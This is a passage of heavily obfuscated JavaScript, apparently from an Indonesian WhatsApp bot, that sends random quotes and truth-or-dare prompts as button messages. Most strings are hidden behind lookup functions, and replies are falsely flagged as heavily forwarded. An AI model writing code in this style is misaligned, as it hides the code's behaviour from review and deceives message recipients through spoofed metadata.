kta=[_0x15af3d(0x65f,0xad7,0x80e,0x80d)+_0x15af3d(0xba8,0xef7,0xd70,0xf4f)+_0x134458(0x16a,0x22a,-0x375,-0xf6)+_0x15af3d(0x998,0x5fb,0x4dc,0xe86)+'ah\x20mengert'+'i.',_0x15af3d(0x48b,0x1df,0x23,0x3d3)+_0x15af3d(0xb27,0xd0c,0xeee,0xeef)+_0x134458(0x762,0x533,0x50d,0x5eb)+_0x15af3d(0x65c,0x3d5,0x84b,0x5e5)+_0x134458(0x878,0x956,0xb44,0x660)+_0x15af3d(0x895,0x5e4,0xd25,0x6e8)+'.\x20Namun,\x20j'+_0x134458(0x5bc,0x952,0xa16,0x6a9)+_0x15af3d(0x59c,0x334,0x9bb,0x406)+_0x15af3d(0x688,0xb77,0x9a8,0x89c)+_0x15af3d(0x501,0x640,0x67f,0x1f9)+'ria,\x20beri\x20'+'dia\x20kekuas'+'aan.','Bila\x20tekad'+_0x15af3d(0x3dc,0x68c,0x4f8,-0x7a)+_0x134458(0x583,0x8c2,0x666,0x600)+_0x15af3d(0x4e8,0x92c,0xf6,0x183)+_0x134458(0x254,-0x1b,-0xfd,0x539)+_0x134458(0xa3b,0x592,0xe24,0x675)+_0x15af3d(0xaa2,0xa3a,0xb85,0x83f)+_0x15af3d(0xb3f,0x7e3,0x9bf,0x9df),_0x134458(0x8e4,0x895,0xd94,0x4d1)+'n\x20adalah\x20p'+_0x15af3d(0x48f,0x298,0x731,0x76c),'Ilmu\x20penge'+_0x15af3d(0xaac,0xdd5,0x9da,0x90e)+_0x15af3d(0xa3a,0xca6,0xe9a,0x625)+_0x134458(0x6de,0x90a,0x986,0xb3e)+'ang.',_0x134458(0xa26,0x917,0x8b1,0xc5c)+_0x15af3d(0xc5a,0xd36,0xc29,0xd8a)+_0x15af3d(0x5e1,0x433,0x9da,0x84f)+_0x15af3d(0x3b4,0x464,-0x10c,0x8)+'tap\x20seimba'+_0x134458(0x2b5,-0xf1,0x3c9,-0x238)+_0x134458(0x16e,-0x165,0x320,-0xb5)+_0x15af3d(0x647,0x33f,0x84a,0x5b5),_0x15af3d(0x5e9,0x790,0x928,0x6c0)+_0x134458(0x935,0x829,0xdde,0x946)+_0x134458(0x91c,0xdb1,0xd10,0xc5e)+_0x15af3d(0xbc9,0x8a5,0xcff,0xf3f)+_0x134458(0xa44,0xc0d,0xad7,0x550)+_0x15af3d(0x2b0,-0x3a,-0x15d,0x2d3)+_0x15af3d(0x51e,0x7d9,0x6d4,0x33a)+_0x134458(0x241,0x2e5,0x403,-0x1fa)+_0x15af3d(0x5dd,0x766,0x916,0x31e),'Sebuah\x20mej'+_0x15af3d(0x55f,0x4d5,0xa44,0x172)+_0x134458(0xabe,0x840,0x79f,0xc54)+'angkuk\x20bua'+_0x134458(0x2a3,0x740,0x14e,0x1e0)+_0x134458(0x488,0xc7,0x7c5,0x822)+'\x20apa\x20lagi\x20'+_0x134458(0x7e4,0x496,0x8b4,0x94a)+_0x15af3d(0x780,0xbd5,0x8af,0x8e6)+_0x134458(0x289,0x96,0x3b2,0x427)+'\x20bisa\x20mera'+'sa\x20bahagia'+'?',_0x134458(0x27e,-0xe4,0x92,0x49e)+_0x15af3d(0x350,-0x9b,0x22,0x149)+_0x15af3d(0xc4e,0x985,0xd76,0x7a3)+_0x134458(0x870,0xa8a,0x68d,0x7b4)+_0x134458(0x6fc,0x752,0x366,0xab0)+'h\x20terhadap'+_0x134458(0x16b,-0x156,0x3c5,0x407)+_0x134458(0x93b,0x95f,0x5aa,0x8cb),'Cara\x20palin'+_0x134458(0x6c4,0x6e0,0x916,0xb5c)+_0x15af3d(0x963,0x680,0xc28,0xa24)+'akkan\x20diri'+_0x15af3d(0x35e,0x3e5,0x3dd,0x1d)+'h\x20memberi\x20'+_0x134458(0x4c9,0x32c,0x379,0x2bf)+_0x134458(0x1f8,0x15c,0x420,-0x28f)+_0x134458(0xb36,0x8cc,0xd59,0xa3b),_0x134458(0x1da,-0xe5,0x2e0,0x53a)+'\x20boleh\x20keh'+'ilangan\x20se'+_0x15af3d(0x6c2,0x4a6,0xb5d,0xb07)+_0x134458(0x215,-0x29f,-0xeb,-0x83)+'lah\x20stimul'+'an\x20terkuat'+_0x15af3d(0x45e,0x42f,0x547,0x338)+'cintai,\x20be'+_0x134458(0x9bf,0xc95,0xb14,0xad4)+_0x15af3d(0x87d,0xadb,0xcdd,0xd46)+'inan\x20untuk'+_0x15af3d(0xc38,0x1041,0x904,0xb85)+'ih\x20lama.',_0x134458(0x515,0x175,0x97f,0x3a8)+'an\x20bahagia'+_0x15af3d(0x565,0x82f,0x483,0x775)+_0x15af3d(0x4f7,0x2ed,0x4c,0x648)+'ntuk\x20bahag'+_0x15af3d(0x389,0x251,0x496,0x2ee),_0x15af3d(0x5df,0x320,0x3a5,0x73a)+_0x15af3d(0x50d,0x937,0x611,0x722)+_0x134458(0x88e,0x755,0xa37,0x7d5)+_0x134458(0x505,0x4cc,0x1b0,0x399)+'gi\x20setiap\x20'+'orang.\x20Say'+_0x134458(0x3c4,0x7ed,0x114,0x402)+_0x15af3d(0x7bd,0x757,0x4dd,0x704)+_0x134458(0x4df,0x83,0x2e8,0x4a9)+_0x134458(0x28e,0x13e,0x2e3,0x24e)+_0x134458(0x643,0xb25,0x649,0x293),_0x134458(0x53c,0x6c6,0xa2f,0x10d)+_0x134458(0xb00,0x6b9,0x8a4,0xf1f)+_0x134458(0x409,0x139,0x6a5,0x3eb)+_0x15af3d(0x6a4,0x35a,0x3b3,0x363)+'dikit\x20perk'+'ataannya.',_0x134458(0x1f7,-0x152,-0x270,0x6de)+_0x15af3d(0x941,0x814,0xd96,0xdb4)+_0x134458(0x9f9,0xada,0xc8b,0x5cc)+_0x134458(0x3a0,0x7a4,0x7db,0x5c7)+_0x15af3d(0x7db,0x73b,0xc1c,0x9f2)+_0x134458(0x880,0xb21,0xb8e,0x7df)+_0x15af3d(0xabc,0xf7b,0xbe7,0x70a)+'untuk\x20nafs'+_0x134458(0x410,-0xe1,0x278,0x45c)+_0x15af3d(0x738,0x565,0x66c,0x6d2)+_0x134458(0x6e4,0x2ea,0xa9b,0x6a5)+_0x134458(0x2f1,-0x2b,-0x138,0x75a)+_0x15af3d(0xbcd,0x9c0,0xf79,0xcb9),'Sahabat\x20ya'+_0x134458(0xa33,0xa7a,0x999,0x7d0)+_0x134458(0xb31,0x649,0xf43,0xc52)+'\x20harganya\x20'+_0x134458(0x97c,0xaaa,0x707,0x990)+_0x134458(0x424,0x6c9,0x79a,0x1f3)+_0x134458(0x7c2,0xa51,0x2ed,0x838)+_0x15af3d(0x598,0x673,0xa0b,0x30e)+_0x134458(0x2ef,0x706,0x251,-0xdc)+_0x134458(0x942,0x88f,0xc1e,0x954),'Yang\x20palin'+_0x15af3d(0x55b,0x92b,0x586,0x72f)+'an\x20dalam\x20h'+'idup\x20adala'+_0x134458(0x456,0x774,0x34e,0x648)+_0x15af3d(0x77d,0xa3b,0x391,0x7a5)+_0x15af3d(0x981,0xb1f,0x670,0x6ce)+'us.',_0x134458(0x20a,-0x68,0x6c8,0x10f)+_0x15af3d(0x7fc,0xb0b,0xcc5,0xa7c)+_0x15af3d(0x4fd,0x51b,0x186,0xa9)+'Tuhan\x20memb'+_0x134458(0x44c,0x2d5,0x33d,0x881)+_0x15af3d(0x71e,0x28a,0x34e,0x349)+'\x20berusaha.'+_0x15af3d(0xb5c,0x726,0x783,0x70f)+'rnah\x20berfi'+_0x134458(0x7ec,0xc0e,0x818,0xbc3)+'sudah\x20tert'+'utup.','Penundaan\x20'+_0x134458(0x4f7,0x869,0x7a,0xe9)+'uran\x20diman'+_0x134458(0x366,0x219,0xa2,-0xfb)+_0x15af3d(0x7e5,0x828,0x3f5,0xb88)+'.','Cinta\x20buka'+_0x134458(0x594,0x376,0x643,0x356)+_0x15af3d(0x2a8,-0xfe,-0x230,0x1f)+_0x134458(0x3f3,0x6f,0x4cc,0x247)+_0x134458(0x93c,0xd28,0x628,0xb4c)+'arah\x20yang\x20'+_0x15af3d(0x372,0x6ce,0x671,0x2e8)+_0x15af3d(0x2b1,0x242,0x56b,0x471),_0x15af3d(0x395,0x416,0x145,0x3b5)+_0x15af3d(0x7ec,0xb74,0xcbe,0x52c)+_0x15af3d(0xaf9,0xd85,0x7e4,0x69e)+_0x15af3d(0x81d,0x386,0x60a,0x67b)+_0x15af3d(0xbff,0xe36,0xa48,0xd2a)+_0x15af3d(0x302,0x120,-0x101,-0x1de)+_0x15af3d(0xb7b,0x998,0x6ff,0x78c)+_0x15af3d(0xb80,0x766,0x809,0xcc4)+_0x15af3d(0x3e4,0x699,-0xed,0x54)+_0x15af3d(0x4de,0x76c,0x390,0x313)+_0x15af3d(0x497,0x454,0x452,0x865)+_0x15af3d(0xc25,0xb78,0xee2,0xf2e),_0x134458(0x4ce,0x938,0x6e1,0x4d1)+_0x134458(0x1b4,-0x2aa,0x606,0x165)+_0x15af3d(0xa30,0xa73,0x6b2,0xa9e)+_0x15af3d(0x7aa,0x432,0x703,0xa48)+'tau\x20putri\x20'+_0x134458(0xaea,0xcc9,0xe83,0xa0a)+'di\x20seperti'+_0x134458(0x3c9,0x83f,0x32a,0x385)+'i\x20Anda\x20han'+_0x15af3d(0xa84,0xf3d,0xc47,0xc74)+_0x134458(0x59d,0x8a2,0x455,0x28a),_0x15af3d(0xa45,0xf01,0x62c,0x5a7)+_0x15af3d(0xb14,0xd02,0x8e9,0xe4e)+_0x15af3d(0x840,0x839,0xaf3,0xba6)+'ain\x20tertaw'+_0x134458(0x1d2,-0x19f,0x627,-0x1b2)+_0x15af3d(0x9a0,0x4af,0xade,0x97e)+'ndapatkan\x20'+_0x15af3d(0x55e,0x9b2,0x923,0x2e7)+_0x134458(0x9e5,0xc9a,0xd47,0xbef)+_0x15af3d(0x835,0xd1c,0x934,0x686)+'.',_0x134458(0x467,0x726,0x739,0x347)+_0x15af3d(0x37b,-0x4f,0x125,0x548)+'cepat\x20atau'+_0x134458(0x26b,0x484,0x3da,0x608)+'ika\x20masala'+_0x15af3d(0xb8c,0xd20,0xf78,0x874)+_0x134458(0xa7d,0xf06,0x973,0x798)+_0x15af3d(0x427,0x558,0x14f,0xa2)+'\x20mungkin.\x20'+_0x134458(0x75c,0x8c7,0x4a7,0x40b)+_0x15af3d(0x85e,0xbd8,0x822,0x53e)+_0x15af3d(0x3e5,0x637,0x393,0x7d8)+_0x15af3d(0x363,0x3a,-0xc6,0x7b3)+_0x15af3d(0x3c3,0x309,0x87b,0x10e)+_0x134458(0xacb,0xc4e,0xf23,0xb06),_0x15af3d(0x91b,0x88c,0xaff,0x531)+_0x15af3d(0xaef,0x96a,0xf9d,0xb49)+_0x134458(0x3c0,-0xc0,0x821,0x88)+_0x134458(0x30b,0x14a,0x15e,0x37c)+_0x134458(0x659,0x1c5,0x460,0xb02)+_0x134458(0x795,0x515,0x3e5,0x9fc)+_0x15af3d(0x71a,0x3e4,0x288,0x624)+'ang\x20kita\x20l'+_0x15af3d(0x33c,0x2b1,0x484,0x4c)+_0x134458(0xa53,0x6b1,0x61c,0x8c9)+'\x20masa\x20depa'+'n.',_0x134458(0x281,0x1e2,0x25,0xd)+'adalah\x20tem'+_0x15af3d(0x765,0x896,0x5f7,0x2ec)+_0x15af3d(0x99d,0xbdb,0x91d,0x52b)+'n.',_0x15af3d(0x58a,0x279,0x63b,0x86f)+'g\x20kreatif\x20'+_0x15af3d(0x339,0x4d2,0x526,-0x19)+_0x134458(0x362,0x4bf,0x60a,0x6de)+'nginan\x20unt'+_0x15af3d(0xb19,0x93c,0xad1,0xd9c)+_0x15af3d(0x3ff,0x254,0x13c,0x105)+_0x15af3d(0x3f8,0x592,0x5eb,0x5fc)+_0x134458(0x9d5,0x59e,0xb6c,0x526)+_0x15af3d(0xb7a,0xaa1,0xe86,0xfb1)+'ang\x20lain.',_0x15af3d(0xc15,0x85d,0xbce,0xffd)+_0x134458(0x6d0,0x591,0x2ef,0xa5b)+_0x134458(0x7c3,0x442,0x7e3,0x9cf)+'lah\x20menjad'+'i\x20yang\x20ter'+_0x134458(0x35a,0x815,-0x19,0x5f4)+_0x134458(0x63e,0x9b1,0x581,0x414)+_0x15af3d(0xa82,0x95d,0xe93,0x92a)+_0x15af3d(0x3b9,0x379,0x154,0x75a)+_0x15af3d(0x6d8,0x229,0x47b,0x605)+_0x134458(0x8b9,0x42c,0x3d6,0x864),'Kebencian\x20'+_0x134458(0x97e,0xb80,0x868,0x9df)+_0x134458(0x3da,0x2d3,0x659,0x8aa)+',\x20berkobar'+_0x15af3d(0xb09,0x8b0,0xf70,0xdbf)+_0x134458(0x635,0x202,0x1fa,0x323)+'l.',_0x134458(0x63c,0x784,0x37c,0x182)+_0x15af3d(0xb93,0x96a,0x106a,0x9ba)+_0x134458(0x641,0xa4d,0x6c9,0x157)+_0x134458(0x96c,0x97e,0x944,0x714)+_0x134458(0x908,0x6be,0xcc8,0xd17),_0x15af3d(0x431,0x87f,0x38e,0x191)+'ang\x20intens'+_0x15af3d(0xa6c,0x627,0x586,0xb80)+_0x15af3d(0xa78,0xd5c,0xeea,0x685)+_0x134458(0x527,0x260,0x7e9,0x7e6)+_0x134458(0x645,0x649,0x9d9,0xa1f)+_0x15af3d(0x613,0x1b0,0x8e4,0x770)+_0x15af3d(0xa49,0xf07,0x6c5,0xc38)+_0x134458(0x9cd,0xe72,0xb45,0x615)+_0x134458(0x1ff,0x358,0xc2,0x52a)+'ung-renung'+'.',_0x134458(0x8c0,0x807,0xb09,0x59d)+_0x15af3d(0x6f7,0x944,0x4c8,0x99e)+_0x134458(0x35c,0x811,0x507,0xab)+_0x15af3d(0xa6d,0xded,0x585,0xeb2)+'\x20orang\x20lai'+_0x15af3d(0x7d0,0xbf2,0x6b7,0xc89)+_0x134458(0x83e,0x7bb,0x7e6,0xc68)+_0x15af3d(0x3bb,0x2a9,0x18,0x248)+_0x15af3d(0xb50,0x6c5,0x7ff,0x9ec)+_0x134458(0xb18,0xd39,0x6b2,0x79e)+_0x15af3d(0xc78,0x102e,0x7f3,0x96d)+_0x134458(0xafa,0xd2a,0xfd1,0xaa0)+_0x134458(0x256,0x379,-0x27b,-0x245)+'nya\x20sendir'+'i.',_0x15af3d(0xc1b,0x892,0xfa1,0xe46)+'jaminan\x20ke'+_0x134458(0x385,-0x99,0x4a0,0x199)+_0x134458(0x460,0x71d,0x91c,0x362)+_0x134458(0x3be,0x6f,0x494,0x703)+_0x15af3d(0x54e,0x31a,0x763,0x83e)+_0x15af3d(0x37f,0xb2,0x2cd,0x35e)+_0x134458(0x72d,0x39d,0x480,0x9fe),_0x15af3d(0x5f3,0x687,0x51b,0x896)+_0x134458(0xb35,0x6e1,0x1020,0x756)+'\x20sukses\x20it'+_0x15af3d(0xb66,0xfdf,0x8c5,0xe12)+'i\x20kunci\x20me'+'nuju\x20kegag'+'alan\x20adala'+_0x15af3d(0x979,0xa3c,0x573,0x8c5)+_0x134458(0x813,0x7f5,0x650,0xc8c)+_0x134458(0x991,0xdda,0x61e,0xe49)+_0x134458(0x1d7,-0x14c,-0x2e1,0x6c8)],su=kta[Math['floor'](Math['random']()*kta[_0x15af3d(0x8be,0xd59,0x62e,0xd0e)])],_0x328f9f={};_0x328f9f['displayTex'+'t']=_0x15af3d(0x5c2,0x901,0x5ac,0x16e);const _0xb0290c={};_0xb0290c[_0x15af3d(0xc33,0xd29,0xaee,0xcc1)]=_0x134458(0x2c0,-0xf5,0xa4,-0x1df),_0xb0290c[_0x134458(0x454,-0x65,0x1b1,0x8d0)]=_0x328f9f,_0xb0290c['type']=0x1;const _0x56b2d0={};_0x56b2d0[_0x15af3d(0x6ec,0xa7f,0x882,0xa39)+'t']='Next\x20➡️';const _0x47b39e={};_0x47b39e['buttonId']=''+command,_0x47b39e[_0x15af3d(0x5a7,0x8f4,0x2a5,0x7e0)]=_0x56b2d0,_0x47b39e[_0x134458(0x8ff,0x9ba,0xc40,0x453)]=0x1;var buttonns=[_0xb0290c,_0x47b39e];buttonMessage={'contentText':su,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+('Next\x20\x20for\x20'+_0x134458(0x1a3,0x30c,0x666,-0x247)+_0x15af3d(0x3bc,-0x109,-0x94,0x333))+enter+_0x15af3d(0x919,0x8ee,0xa55,0x9cd)+sender[_0x134458(0x3ec,0x5e6,0x595,0x8ad)]('@')[0x15*0x63+-0x108e+-0x7f*-0x11],'buttons':buttonns,'headerType':0x1};const _0x57d4b0={};_0x57d4b0[_0x134458(0xa1b,0x8a8,0xdff,0x54b)]='hi',_0x57d4b0[_0x134458(0x79e,0x4d2,0x610,0x46e)+'Score']=0x3b9aca00,_0x57d4b0['isForwarde'+'d']=!![],_0x57d4b0[_0x15af3d(0x62a,0x3e2,0x54d,0x22d)+_0x15af3d(0x5ca,0x16f,0x8b9,0xa2c)]=!![],_0x57d4b0[_0x15af3d(0x556,0x7e3,0x5fe,0x3a6)+'id']=[sender];const _0x46229d={};_0x46229d['caption']='Botwea\x20©2k'+'21',_0x46229d[_0x134458(0x968,0x50d,0xe5b,0x528)+'o']=_0x57d4b0,_0x46229d[_0x134458(0xadb,0x95a,0xd63,0xefe)]=ftoko,_0x46229d[_0x15af3d(0x62a,0x7e3,0x9c7,0x28f)+'ral']=!![],alpha[_0x15af3d(0xad5,0xba9,0x607,0xc68)+'e'](from,buttonMessage,MessageType[_0x134458(0x151,0x105,0x530,0x4b0)+'sage'],_0x46229d),await limitAdd(sender,limit);break;case'dare':const _0x556d8a={};_0x556d8a[_0x15af3d(0x6ec,0x211,0x9be,0x9f4)+'t']=_0x134458(0x806,0x75e,0xbe5,0xc32)+'t';const _0xd79b58={};_0xd79b58['buttonId']=_0x134458(0x7fd,0x7f9,0xc65,0x3c5),_0xd79b58[_0x15af3d(0x5a7,0x546,0x13b,0x53f)]=_0x556d8a,_0xd79b58['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0xcbb,0x5b7,0x479)](prefix),'©\x20'+ownername,[_0xd79b58]);const dare=['Kirim\x20pesa'+_0x134458(0x2d7,0x5ab,-0x15e,-0x15)+_0x134458(0x68d,0xa8d,0x1a0,0x212)+_0x134458(0xaa3,0x706,0x808,0xd61)+'ku\x20masih\x20s'+_0x134458(0x986,0xcc0,0xe16,0x7af)+_0x15af3d(0x530,0x2e2,0x271,0x57),_0x15af3d(0x43c,0x365,0x124,0x14f)+_0x134458(0x191,0xd6,0x312,-0x224)+'ekarang\x20da'+_0x15af3d(0x4d2,0x4f8,0x999,0x3bf)+_0x134458(0x731,0x3eb,0x78b,0xb65),_0x15af3d(0xa43,0xabc,0x86b,0xe05)+_0x134458(0x175,0x631,0x3df,-0x376)+_0x134458(0x923,0x7d6,0x50a,0xa3c),_0x15af3d(0x8f5,0xcec,0xd4c,0x97c)+_0x134458(0x60a,0x478,0x22e,0x3cb)+_0x134458(0x2b7,-0x164,0x168,0x26b)+_0x134458(0xad1,0x73f,0xd83,0xe52)+_0x134458(0xa60,0x9c6,0x709,0xe19),_0x15af3d(0x797,0x5d5,0xb32,0xb1d)+_0x15af3d(0x63c,0xaf6,0xb0f,0xae8)+_0x15af3d(0x59e,0x4a3,0xcc,0x124),_0x15af3d(0x6c3,0x84f,0x6f2,0xa1b)+_0x15af3d(0xb95,0xede,0xb12,0x800)+'getik\x20di\x20g'+_0x15af3d(0x687,0x212,0x9ea,0x5f7)+_0x15af3d(0xa3e,0x7b6,0xd56,0x830),'kirim\x20voic'+_0x15af3d(0x58c,0x4eb,0x9fd,0x313)+_0x15af3d(0x9d0,0x562,0x7da,0x89b)+_0x15af3d(0x8ab,0x879,0x72d,0xbaf)+'y?',_0x134458(0x921,0xb96,0xc45,0x794)+_0x15af3d(0x912,0x9f7,0x7b5,0x502)+_0x15af3d(0xb5b,0xa77,0x749,0xbea)+_0x15af3d(0x3b5,0x1a4,0x631,0x33a)+_0x134458(0x351,0x49d,-0xe7,0x405)+'ok\x20buat\x20ku'+_0x134458(0x700,0x616,0x4c4,0x70d),_0x134458(0x8ab,0xc3c,0x51a,0x86f)+_0x15af3d(0xaf7,0xb98,0xd0e,0xb59)+_0x15af3d(0x734,0x9d9,0x248,0x333),'ketik\x20pake'+'\x20bahasa\x20da'+_0x15af3d(0x69d,0x1c3,0x709,0x9e4)+'m',_0x15af3d(0xb45,0xa3b,0x74b,0xf32)+_0x15af3d(0x38d,0x4af,-0x92,0x5ea)+_0x134458(0x5d1,0xa84,0x9fe,0x27f)+'ucinta\x20lun'+_0x134458(0x8c1,0x8ff,0x9b6,0x8bc)+_0x134458(0xa88,0x71e,0x98f,0xf30),_0x134458(0x48b,0x328,0x6b2,0xa8)+_0x134458(0x97f,0x9ff,0x746,0x499)+_0x134458(0x708,0xb6a,0x447,0x982)+'i\x20%batre\x20k'+_0x15af3d(0x909,0xb86,0x59f,0x9f0)+_0x134458(0x5ed,0x44c,0x14d,0x21a)+'\x20dia\x20\x22i\x20lu'+_0x15af3d(0x743,0xbea,0xae8,0x540)+_0x15af3d(0x608,0x388,0x4f5,0x3b1),_0x15af3d(0x3ea,0x6c2,0x243,0x283)+_0x15af3d(0x6b7,0x581,0x72c,0x3cd)+_0x15af3d(0x854,0xca4,0x5d0,0x75f)+_0x134458(0x316,0x1f7,0x14f,0x48c)+'\x20pgn\x20balik'+'an',_0x134458(0xafc,0xeab,0xeab,0x789)+_0x134458(0x18d,-0x21e,0x40b,-0x2e5)+_0x134458(0x52c,0x407,0x851,0x38e)+_0x15af3d(0x8d1,0x567,0x563,0x532),'bilang\x20\x22i\x20'+_0x134458(0x461,0x302,0x530,0x65b)+_0x134458(0x7eb,0x968,0x32d,0x4b4)+_0x15af3d(0xbf4,0xdd7,0x103c,0xb03)+'rku\x20gak?\x22\x20'+'ke\x20lawan\x20j'+_0x15af3d(0xb9f,0xe2d,0xe3b,0x7ef)+_0x15af3d(0x866,0x5e7,0xb48,0xb83)+_0x15af3d(0x54a,0x178,0x3e4,0x1f3)+_0x15af3d(0x3cf,0x1c4,0x35e,0x708)+_0x15af3d(0x358,-0xeb,0x588,0x1ed)+_0x15af3d(0x45b,0x6,0x817,0x197)+_0x134458(0x865,0x8b2,0x638,0xce8)+_0x134458(0x66d,0x4ac,0x2d7,0x6ea)+_0x134458(0x6c9,0x23b,0x354,0x9a4)+_0x15af3d(0x9b2,0x792,0x734,0x5ec),_0x15af3d(0x77b,0x4bc,0x868,0x2a0)+_0x15af3d(0x7f1,0x587,0xcbd,0x7b9)+_0x134458(0x662,0x6b5,0x19c,0x616),_0x134458(0x80c,0xca7,0x81e,0x3eb)+_0x15af3d(0x768,0x97c,0xb77,0x5e4)+'/crush','teriak\x20gaj'+_0x134458(0x617,0x3e4,0x36d,0x7bf)+'kirim\x20pake'+_0x134458(0x51b,0x220,0x76a,0x52c),'pap\x20mukamu'+'\x20lalu\x20kiri'+'m\x20ke\x20salah'+_0x15af3d(0xa11,0x6bb,0x87b,0xa5f)+_0x134458(0x765,0x840,0x6c5,0x508),_0x134458(0x381,0x256,0x822,0x471)+_0x15af3d(0x418,0x8e3,-0x8,-0xaa)+'caption,\x20a'+'ku\x20anak\x20pu'+_0x15af3d(0x5f2,0x443,0xa68,0x1b0),_0x15af3d(0x509,0x8c3,0x47,0x43a)+'e\x20kata\x20kas'+_0x15af3d(0x901,0xc2a,0x967,0xaa8)+_0x134458(0x2ce,0x5b4,0x753,-0xc5)+_0x134458(0x4b6,0x6cb,0x3f2,-0x35),_0x134458(0x854,0x546,0xb8b,0xcb7)+'njimm\x20gabu'+'tt\x20anjimmm'+_0x15af3d(0xa54,0x83b,0x9b0,0x801)+'n\x20rumah\x20mu','ganti\x20nama'+_0x15af3d(0x417,0x33e,0x78f,0x7ef)+'WO\x20\x22\x20selam'+_0x15af3d(0x2d3,-0x1ed,0x45d,0x5e3),_0x15af3d(0xa50,0x7bf,0x763,0xea9)+'kerasukan,'+'\x20contoh\x20:\x20'+_0x134458(0x740,0x306,0x54b,0x660)+_0x134458(0x830,0x8ee,0xadb,0x528)+_0x15af3d(0xc32,0x8df,0xf3a,0x82b)+_0x15af3d(0xaca,0x936,0xd1b,0x946)+_0x15af3d(0x452,0x2d8,0x1ff,0x868)+_0x15af3d(0xb31,0xec9,0xa57,0xc06)],der=dare[Math[_0x134458(0x989,0xe06,0xd6d,0x6f6)](Math[_0x15af3d(0x696,0x9cd,0x39e,0x568)]()*dare[_0x15af3d(0x8be,0x853,0xbc5,0x924)])],_0xe86efe={};_0xe86efe[_0x134458(0x599,0x884,0xa8c,0x8a3)+'t']=_0x134458(0x46f,0x6bc,0x843,0x918);const _0x354a3f={};_0x354a3f[_0x134458(0xae0,0x820,0x887,0xe14)]=_0x15af3d(0x413,0x256,0x4bf,-0x31),_0x354a3f[_0x134458(0x454,0x79c,0x863,0x8f3)]=_0xe86efe,_0x354a3f[_0x134458(0x8ff,0x776,0x6c1,0x60d)]=0x1;const _0x3bd6a6={};_0x3bd6a6[_0x134458(0x599,0x31a,0x418,0x205)+'t']=_0x15af3d(0x9b0,0x917,0xa8f,0x969);const _0x52edc7={};_0x52edc7['buttonId']=''+command,_0x52edc7[_0x134458(0x454,0x8cd,0x200,-0x32)]=_0x3bd6a6,_0x52edc7['type']=0x1;var buttonns=[_0x354a3f,_0x52edc7];buttonMessage={'contentText':der,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x15af3d(0xb88,0xba0,0x8f0,0xb8b)+_0x15af3d(0x2f6,0x2fb,-0x167,-0x5c)+'s\x20💞')+enter+_0x134458(0x7c6,0x420,0x72b,0x873)+sender[_0x134458(0x3ec,0x315,0x408,0x6d3)]('@')[-0x496*-0x6+-0xb69*-0x2+-0x3256],'buttons':buttonns,'headerType':0x1};const _0x5a4ec4={};_0x5a4ec4[_0x15af3d(0xb6e,0xeeb,0x6a4,0x71c)]='hi',_0x5a4ec4[_0x134458(0x79e,0x80c,0x7b9,0xc70)+_0x134458(0xab1,0xe93,0x925,0xbb0)]=0x3b9aca00,_0x5a4ec4[_0x134458(0x435,0x63b,0x86,0x2f1)+'d']=!![],_0x5a4ec4[_0x134458(0x4d7,0x79,0x3cc,0x20d)+'ral']=!![],_0x5a4ec4[_0x15af3d(0x556,0x360,0x6da,0x607)+'id']=[sender];const _0xe6ff8={};_0xe6ff8['caption']=_0x134458(0x4ea,0x26,0x2da,0x3)+'21',_0xe6ff8[_0x15af3d(0xabb,0x9f3,0xcac,0x959)+'o']=_0x5a4ec4,_0xe6ff8[_0x15af3d(0xc2e,0xa42,0x844,0xbc2)]=ftoko,_0xe6ff8['sendEpheme'+_0x134458(0x477,0x20e,0x30f,0x892)]=!![],alpha[_0x134458(0x982,0xe70,0x85d,0xb9d)+'e'](from,buttonMessage,MessageType[_0x134458(0x151,-0x174,0x2df,-0x61)+_0x134458(0x9a3,0x9e5,0xe32,0xad5)],_0xe6ff8),await limitAdd(sender,limit);break;case _0x134458(0x8ec,0xb47,0x46a,0x634):const _0xb22201={};_0xb22201['displayTex'+'t']='Check\x20Limi'+'t';const _0x469ded={};_0x469ded[_0x134458(0xae0,0x962,0xdbb,0xb2b)]='limit',_0x469ded[_0x134458(0x454,0x4be,0x421,0x426)]=_0xb22201,_0x469ded[_0x134458(0x8ff,0xb7a,0x488,0x56a)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x5ea,0xbc0,0xc54)](prefix),'©\x20'+ownername,[_0x469ded]);const trut=[_0x134458(0x4de,0x59,0x326,0x602)+_0x134458(0x57d,0x375,0x185,0x438)+_0x134458(0x6bb,0x703,0x63c,0xa4c)+_0x15af3d(0x762,0x9f2,0x979,0x979),_0x134458(0x7cd,0x7c0,0x9c6,0x689)+_0x15af3d(0x5ac,0x876,0x211,0x86f)+'au\x20mau,\x20di'+_0x134458(0x8d6,0xcb0,0x496,0xc14)+_0x134458(0x990,0x965,0x965,0xa1d)+_0x15af3d(0x626,0x26f,0x928,0xb1a)+_0x15af3d(0xa69,0xbc1,0xa69,0xa29)+_0x134458(0x562,0x624,0x8ff,0x491)+'boleh\x20beda'+_0x134458(0x293,0x1c2,-0x75,-0x1e1)+')',_0x134458(0x3b4,0x86e,0x77b,0x580)+'tan\x20terbes'+_0x134458(0xaf3,0xab3,0x8a2,0xe92),_0x134458(0x74e,0xba8,0x45b,0xaf3)+_0x134458(0x93a,0xb6f,0xa37,0xa78)+_0x15af3d(0x8fa,0x4c3,0x62a,0x6c7)+_0x134458(0x4e6,0x685,0x53f,0x1f8)+'itu\x20suka\x20s'+_0x15af3d(0x73e,0x986,0x3a4,0x2df)+_0x15af3d(0x63b,0x910,0x2b2,0x657),_0x15af3d(0xaa6,0xeb7,0xb1d,0x954)+'\x20mantan\x20pa'+_0x134458(0x7d0,0x550,0xbc4,0x2f1)+_0x134458(0x2d8,0x1b2,0x179,0x674)+_0x134458(0x188,0xac,0xc0,-0x9c)+_0x134458(0x587,0xa13,0x8e2,0x137)+'\x20diam?',_0x15af3d(0x90e,0xb0c,0x879,0xa50)+_0x134458(0x787,0x429,0x5e7,0xb49)+'g\x20nyokap\x20a'+_0x15af3d(0x423,0x773,0x691,0x7cb)+_0x15af3d(0x8a4,0xc53,0x56b,0x9d6),_0x134458(0xb0e,0xeea,0xd58,0x7da)+_0x134458(0x4cc,0xce,-0x1,0x539)+_0x134458(0x20f,0x45f,0x1b5,-0x1d5)+_0x15af3d(0x79f,0x998,0xc6c,0x37f)+'apa',_0x15af3d(0xb08,0xa09,0xc9e,0xf3c)+_0x15af3d(0x907,0xae4,0xb2d,0xdc3)+_0x15af3d